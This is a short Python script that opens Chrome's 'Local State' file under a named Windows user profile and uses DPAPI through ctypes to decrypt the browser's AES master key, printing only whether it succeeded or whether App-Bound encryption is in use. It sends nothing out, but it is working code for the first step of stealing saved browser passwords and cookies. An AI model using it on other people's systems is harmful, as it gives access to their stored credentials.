import os
import json
import base64
import ctypes
from ctypes import wintypes

class DATA_BLOB(ctypes.Structure):
    _fields_ = [('cbData', wintypes.DWORD),
                ('pbData', ctypes.POINTER(ctypes.c_char))]

def decrypt_dpapi(encrypted_bytes):
    blob_in = DATA_BLOB(len(encrypted_bytes), ctypes.create_string_buffer(encrypted_bytes))
    blob_out = DATA_BLOB()
    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
        return ctypes.string_at(blob_out.pbData, blob_out.cbData)
    return None

try:
    local_state_path = r'C:\Users\doris\AppData\Local\Google\Chrome\User Data\Local State'
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    print("Encrypted key prefix:", encrypted_key[:5])
    if encrypted_key.startswith(b'DPAPI'):
        aes_key = decrypt_dpapi(encrypted_key[5:])
        if aes_key:
            print("Successfully decrypted AES master key! Key length:", len(aes_key))
        else:
            print("CryptUnprotectData returned None")
    elif encrypted_key.startswith(b'APPB'):
        print("Uses App-Bound encryption (APPB)")
    else:
        print("Unknown key prefix:", encrypted_key[:10])

except Exception as e:
    print("Error:", e)
